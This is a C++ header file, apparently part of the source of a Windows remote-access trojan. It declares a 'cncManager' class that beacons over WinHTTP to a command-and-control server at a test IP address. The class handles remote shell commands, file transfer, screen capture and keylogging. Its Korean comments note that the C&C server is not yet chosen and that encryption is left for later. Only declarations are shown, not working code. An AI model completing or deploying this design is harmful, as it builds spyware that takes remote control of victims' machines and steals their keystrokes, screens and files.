#pragma once
#include "commandManager.h"
#include <Windows.h>
#include "DDproto.h"
#include <winhttp.h>
#include <string>
#include <list>
#include <mutex>

class cncManager
{
private:
	LPCWSTR
		/* 일단 C&C 정해지기 전이라 테스트용*/
		server = L"172.17.242.56",
		index = L"/tests";


	std::list<std::string> shellCmd;
	

public:
	cncManager();
	cncManager(LPCWSTR server);
	~cncManager();
	void responseParser(UCHAR* res, DWORD len);
	void sendHttpRequest(LPVOID data, DWORD dlen);
	void sendBeacon();
	void sendData(UCHAR DDtype, ULONG64 len, LPVOID stream);
	void printParsedResponse(DDprotocol* resData, std::string data);
	void handleShellRequest();
	void handleFtpRequest(std::string path);
	void handleScreenRequest();
	void handleKeyLog();
	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
	LPVOID dataEncrypt(LPVOID data);
	LPVOID dataDecrypt(LPVOID data);
	bool print_setting = false;
	std::mutex m1, m2;
};
